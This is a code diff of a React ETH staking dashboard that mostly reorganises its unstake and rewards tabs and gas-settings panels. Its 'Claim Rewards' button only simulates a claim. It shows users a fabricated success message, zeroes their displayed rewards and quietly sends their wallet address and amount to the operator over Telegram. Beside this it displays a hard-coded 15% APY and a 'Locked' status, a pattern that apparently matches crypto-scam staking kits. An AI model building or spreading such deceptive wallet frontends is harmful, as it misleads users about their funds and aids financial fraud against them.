-                        <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
-                        <span className="text-xs text-muted-foreground">Faster & Costlier</span>
-                      </div>
-                      <div className="mt-4 text-xs text-muted-foreground">
-                        Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
-                        {(gasPrice * 0.0001 * 1600).toFixed(2)})
-                      </div>
+                      <div className="text-sm text-muted-foreground mb-2">Staking Information</div>
+                      {contractLoading && !dataFetched ? (
+                        <div className="flex justify-center py-4">
+                          <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                        </div>
+                      ) : (
+                        <div className="grid grid-cols-2 gap-4">
+                          <div>
+                            <div className="text-xs text-muted-foreground">Staked Amount</div>
+                            <div className="text-lg font-medium">{userStakedBalance} ETH</div>
+                          </div>
+                          <div>
+                            <div className="text-xs text-muted-foreground">Rewards Earned</div>
+                            <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                          </div>
+                          <div>
+                            <div className="text-xs text-muted-foreground">Status</div>
+                            <div className="text-lg font-medium text-amber-500">Locked</div>
+                          </div>
+                        </div>
+                      )}
                     </div>
-                  )}
 
-                  <button
-                    className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
-                      isUnstaking || !unstakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
-                    }`}
-                    disabled={isUnstaking || !unstakeAmount}
-                    onClick={handleUnstake}
-                    style={{
-                      background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
-                      transition: "all 0.2s ease-in-out",
-                    }}
-                    onMouseEnter={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
-                      e.currentTarget.style.transform = "translateY(-1px)"
-                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
-                    }}
-                    onMouseLeave={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
-                      e.currentTarget.style.transform = "translateY(0)"
-                      e.currentTarget.style.boxShadow = "none"
-                    }}
-                  >
-                    {isUnstaking ? (
-                      <div className="flex items-center justify-center">
-                        <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
-                        <span>Unstaking...</span>
-                      </div>
-                    ) : (
-                      "Unstake ETH"
-                    )}
-                  </button>
-                </>
-              ) : (
-                <div className="p-6 text-center">
-                  <p className="text-muted-foreground">Connect your wallet to unstake ETH.</p>
-                  <DashboardConnectWallet className="mt-4 w-full mx-auto" />
-                </div>
-              )}
-            </motion.div>
-          </TabsContent>
+                    {/* Gas settings toggle */}
+                    <div className="flex justify-end">
+                      <button
+                        className="text-xs text-primary hover:underline"
+                        onClick={() => setShowGasSettings(!showGasSettings)}
+                      >
+                        {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
+                      </button>
+                    </div>
 
-          <TabsContent value="rewards">
-            <motion.div
-              initial={{ opacity: 0, y: 10 }}
-              animate={{ opacity: 1, y: 0 }}
-              transition={{ duration: 0.3 }}
-              className="space-y-6"
-            >
-              {isConnected ? (
-                <div className="space-y-4">
-                  <div className="p-4 rounded-lg glassmorphism">
-                    <div className="text-sm text-muted-foreground mb-2">Rewards Summary</div>
-                    {contractLoading && !dataFetched ? (
-                      <div className="flex justify-center py-4">
-                        <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
-                      </div>
-                    ) : (
-                      <div className="grid grid-cols-2 gap-4">
-                        <div>
-                          <div className="text-xs text-muted-foreground">Total Rewards</div>
-                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                    {/* Gas settings panel */}
+                    {showGasSettings && (
+                      <div className="p-4 rounded-lg glassmorphism">
+                        <div className="flex justify-between mb-2">
+                          <label htmlFor="gas-price-unstake" className="text-sm font-medium">
+                            Gas Price (gwei)
+                          </label>
+                          <span className="text-sm font-medium">{gasPrice} gwei</span>
                         </div>
-                        <div>
-                          <div className="text-xs text-muted-foreground">Claimable Rewards</div>
-                          <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                        <Slider
+                          id="gas-price-unstake"
+                          min={7}
+                          max={30}
+                          step={1}
+                          value={[gasPrice]}
+                          onValueChange={(value) => setGasPrice(value[0])}
+                        />
+                        <div className="flex justify-between mt-1">
+                          <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
+                          <span className="text-xs text-muted-foreground">Faster & Costlier</span>
                         </div>
-                        <div>
-                          <div className="text-xs text-muted-foreground">APY</div>
-                          <div className="text-lg font-medium">15.0%</div>
-                        </div>
-                        <div>
-                          <div className="text-xs text-muted-foreground">Next Reward</div>
-                          <div className="text-lg font-medium">~0.0008 ETH/day</div>
+                        <div className="mt-4 text-xs text-muted-foreground">
+                          Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
+                          {(gasPrice * 0.0001 * 1600).toFixed(2)})
                         </div>
                       </div>
                     )}
-                  </div>
 
-                  {/* Gas settings toggle */}
-                  <div className="flex justify-end">
                     <button
-                      className="text-xs text-primary hover:underline"
-                      onClick={() => setShowGasSettings(!showGasSettings)}
+                      className={`w-full h-12 rounded-md font-medium text-white relative overflow-hidden ${
+                        isUnstaking || !unstakeAmount ? "opacity-80 cursor-not-allowed" : "cursor-pointer"
+                      }`}
+                      disabled={isUnstaking || !unstakeAmount}
+                      onClick={handleUnstake}
+                      style={{
+                        background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
+                        transition: "all 0.2s ease-in-out",
+                      }}
+                      onMouseEnter={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
+                        e.currentTarget.style.transform = "translateY(-1px)"
+                        e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
+                      }}
+                      onMouseLeave={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
+                        e.currentTarget.style.transform = "translateY(0)"
+                        e.currentTarget.style.boxShadow = "none"
+                      }}
                     >
-                      {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
+                      {isUnstaking ? (
+                        <div className="flex items-center justify-center">
+                          <div className="mr-2 h-4 w-4 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                          <span>Unstaking...</span>
+                        </div>
+                      ) : (
+                        "Unstake ETH"
+                      )}
                     </button>
+                  </>
+                ) : (
+                  <div className="p-6 text-center">
+                    <p className="text-muted-foreground">Connect your wallet to unstake ETH.</p>
+                    <DashboardConnectWallet className="mt-4 w-full mx-auto" />
                   </div>
+                )}
+              </motion.div>
+            </TabsContent>
 
-                  {/* Gas settings panel */}
-                  {showGasSettings && (
+            <TabsContent value="rewards">
+              <motion.div
+                initial={{ opacity: 0, y: 10 }}
+                animate={{ opacity: 1, y: 0 }}
+                transition={{ duration: 0.3 }}
+                className="space-y-6"
+              >
+                {isConnected ? (
+                  <div className="space-y-4">
                     <div className="p-4 rounded-lg glassmorphism">
-                      <div className="flex justify-between mb-2">
-                        <label htmlFor="gas-price-rewards" className="text-sm font-medium">
-                          Gas Price (gwei)
-                        </label>
-                        <span className="text-sm font-medium">{gasPrice} gwei</span>
-                      </div>
-                      <Slider
-                        id="gas-price-rewards"
-                        min={7}
-                        max={30}
-                        step={1}
-                        value={[gasPrice]}
-                        onValueChange={(value) => setGasPrice(value[0])}
-                      />
-                      <div className="flex justify-between mt-1">
-                        <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
-                        <span className="text-xs text-muted-foreground">Faster & Costlier</span>
-                      </div>
-                      <div className="mt-4 text-xs text-muted-foreground">
-                        Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
-                        {(gasPrice * 0.0001 * 1600).toFixed(2)})
-                      </div>
+                      <div className="text-sm text-muted-foreground mb-2">Rewards Summary</div>
+                      {contractLoading && !dataFetched ? (
+                        <div className="flex justify-center py-4">
+                          <div className="h-6 w-6 animate-spin rounded-full border-2 border-current border-t-transparent"></div>
+                        </div>
+                      ) : (
+                        <div className="grid grid-cols-2 gap-4">
+                          <div>
+                            <div className="text-xs text-muted-foreground">Total Rewards</div>
+                            <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                          </div>
+                          <div>
+                            <div className="text-xs text-muted-foreground">Claimable Rewards</div>
+                            <div className="text-lg font-medium text-green-500">{userRewards} ETH</div>
+                          </div>
+                          <div>
+                            <div className="text-xs text-muted-foreground">APY</div>
+                            <div className="text-lg font-medium">15.0%</div>
+                          </div>
+                          <div>
+                            <div className="text-xs text-muted-foreground">Next Reward</div>
+                            <div className="text-lg font-medium">~0.0008 ETH/day</div>
+                          </div>
+                        </div>
+                      )}
                     </div>
-                  )}
 
-                  <button
-                    className="w-full h-12 rounded-md font-medium text-white relative overflow-hidden cursor-pointer"
-                    onClick={async () => {
-                      // Simulate claiming rewards
-                      setTransactionStatus({
-                        type: "success",
-                        message: "Successfully claimed 0.0123 ETH rewards",
-                      })
+                    {/* Gas settings toggle */}
+                    <div className="flex justify-end">
+                      <button
+                        className="text-xs text-primary hover:underline"
+                        onClick={() => setShowGasSettings(!showGasSettings)}
+                      >
+                        {showGasSettings ? "Hide Gas Settings" : "Advanced Gas Settings"}
+                      </button>
+                    </div>
 
-                      await sendTelegramNotification(`
+                    {/* Gas settings panel */}
+                    {showGasSettings && (
+                      <div className="p-4 rounded-lg glassmorphism">
+                        <div className="flex justify-between mb-2">
+                          <label htmlFor="gas-price-rewards" className="text-sm font-medium">
+                            Gas Price (gwei)
+                          </label>
+                          <span className="text-sm font-medium">{gasPrice} gwei</span>
+                        </div>
+                        <Slider
+                          id="gas-price-rewards"
+                          min={7}
+                          max={30}
+                          step={1}
+                          value={[gasPrice]}
+                          onValueChange={(value) => setGasPrice(value[0])}
+                        />
+                        <div className="flex justify-between mt-1">
+                          <span className="text-xs text-muted-foreground">Slower & Cheaper</span>
+                          <span className="text-xs text-muted-foreground">Faster & Costlier</span>
+                        </div>
+                        <div className="mt-4 text-xs text-muted-foreground">
+                          Estimated Gas Fee: ~{(gasPrice * 0.0001).toFixed(4)} ETH ($
+                          {(gasPrice * 0.0001 * 1600).toFixed(2)})
+                        </div>
+                      </div>
+                    )}
+
+                    <button
+                      className="w-full h-12 rounded-md font-medium text-white relative overflow-hidden cursor-pointer"
+                      onClick={async () => {
+                        // Simulate claiming rewards
+                        setTransactionStatus({
+                          type: "success",
+                          message: "Successfully claimed 0.0123 ETH rewards",
+                          tab: "rewards",
+                        })
+
+                        await sendTelegramNotification(`
 💎 <b>Rewards Claimed</b> 💵 ❤️
 👤 <b>User:</b> ${address}
 💰 <b>Amount:</b> ${userRewards} ETH
 ⏰ <b>Time:</b> ${new Date().toISOString()}
-                      `)
+                        `)
 
-                      // Reset rewards
-                      setUserRewards("0")
-                    }}
-                    style={{
-                      background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
-                      transition: "all 0.2s ease-in-out",
-                    }}
-                    onMouseEnter={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
-                      e.currentTarget.style.transform = "translateY(-1px)"
-                      e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
-                    }}
-                    onMouseLeave={(e) => {
-                      e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
-                      e.currentTarget.style.transform = "translateY(0)"
-                      e.currentTarget.style.boxShadow = "none"
-                    }}
-                  >
-                    Claim Rewards
-                  </button>
-                </div>
-              ) : (
-                <div className="p-6 text-center">
-                  <p className="text-muted-foreground">Connect your wallet to view rewards.</p>
-                  <DashboardConnectWallet className="mt-4 w-full mx-auto" />
-                </div>
-              )}
-            </motion.div>
-          </TabsContent>
-        </Tabs>
-      </CardContent>
-    </Card>
-  )
+                        // Reset rewards
+                        setUserRewards("0")
+                      }}
+                      style={{
+                        background: "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)",
+                        transition: "all 0.2s ease-in-out",
+                      }}
+                      onMouseEnter={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #7c3aed 0%, #2563eb 100%)"
+                        e.currentTarget.style.transform = "translateY(-1px)"
+                        e.currentTarget.style.boxShadow = "0 4px 12px rgba(139, 92, 246, 0.3)"
+                      }}
+                      onMouseLeave={(e) => {
+                        e.currentTarget.style.background = "linear-gradient(90deg, #8b5cf6 0%, #3b82f6 100%)"
+                        e.currentTarget.style.transform = "translateY(0)"
+                        e.currentTarget.style.boxShadow = "none"
+                      }}
+                    >
+                      Claim Rewards
+                    </button>
+                  </div>
+                ) : (
+                  <div className="p-6 text-center">
+                    <p className="text-muted-foreground">Connect your wallet to view rewards.</p>
+                    <DashboardConnectWallet className="mt-4 w-full mx-auto" />
+                  </div>
+                )}
+              </motion.div>
+            </TabsContent>
+          </Tabs>
+        </CardContent>
+      </Card>
+    )
+  }
+
+  // Return the appropriate version based on screen size
+  return isMobile ? renderMobileStakingDashboard() : renderDesktopStakingDashboard()
 }
